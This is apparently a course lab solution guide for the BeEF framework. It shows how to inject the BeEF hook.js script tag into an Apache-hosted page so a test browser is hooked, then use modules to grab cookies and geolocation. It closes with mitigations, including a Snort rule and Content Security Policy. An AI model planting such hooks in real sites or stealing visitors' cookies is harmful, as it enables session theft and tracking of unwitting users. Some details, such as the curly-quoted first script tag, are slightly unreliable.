## Solution Guide: BeEF

In this activity, you explored how malicious JavaScript can be obfuscated within a legitimate website to establish a trust relationship with the victim.

---

1. In Kali, open a terminal window and run `sudo beef-xss`.
   
      This window contains the malicious JavaScript that you will use to hook victim's browser.
      
      - What is the script?
      
        - `<script src=”127.0.0.1:3000/hook.js” type=”text/javascript”></script>`
      
      - Your script should look similar to the one below:
      
      ```html
      <!doctype html>
      <!--- Website template by freewebsitetemplates.com--->
      <html>
      <head>
               <meta charset="UTF-8">
               <meta name="Viewport" content="width=device-width, initial-scale=1.0">
               <title>Space Science Website Template</title>
               <link rel="stylesheet" href="css/style.css" type="text/css">
               <link rel="stylesheet" type="text/css" href="css/mobile.css">
               <script src="js/mobile.js" type="text/javascript"></script>
               <script src="http://127.0.0.1:3000/hook.js"></script> # Updated malicious javascript. 
      </head>
      <body>
      ```
            
2. In the original terminal window, start the Apache web server:
   
   - Run `sudo service apache2 start`
      
3. Open the `/var/www/html/index.html` file and paste the malicious JavaScript.

   - Run `sudo nano /var/www/html/index.html` to open the file. 
      
   - Paste the malicious JavaScript inside the HTML header section, on its own line.
      
      - Save the file and exit. 
   
   - Restart the Apache web server.
     
     - `service apache2 restart`
      
4. Open a web browser and click the **BeEF Authentication** shortcut in the shortcut toolbar. Sign in with:
      
      - Username: `beef`
      - Password: `cybersecurity`
   
5. Acting as the victim open Firefox and navigate to localhost using the URL.
      
      - After the page loads, return to the BeEF framework.

6. In Kali, click on **Commands** and perform at least three successful exploits of your choosing.
   
      - Document your findings and be prepared to share with the class.
      
         Results will vary, but might include: 
         
         - Use Get Geolocation to reveal the location of the user. 
         - Use Get Cookie to reveal the users cookie. 
      
            
7. What mitigation strategies would you suggest to the client to defend against client-side attacks?

   - Any of the options below:

      - The Vegan Chrome browser extension, which is used to detect BeEF hooks.
   
      - Add an emerging threats Snort rule to the company’s IDS as follows: 
      
         `alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (flow:to_server,established; content:"Cookie|3a 20|BEEFSESSION=";)`
   
      - Implement a Content Security Policy.

### Bonus

Perform an attack that displays the message "You've been hacked!" when the victim revisits the malicious webpage.

   -  In BeEF, use the `webcam` command to enter the message in the text box, then click **Execute**. Refresh the webpage on the victim's machine to reveal the message.

---

### Copyright

Trilogy Education Services © 2020. All Rights Reserved.
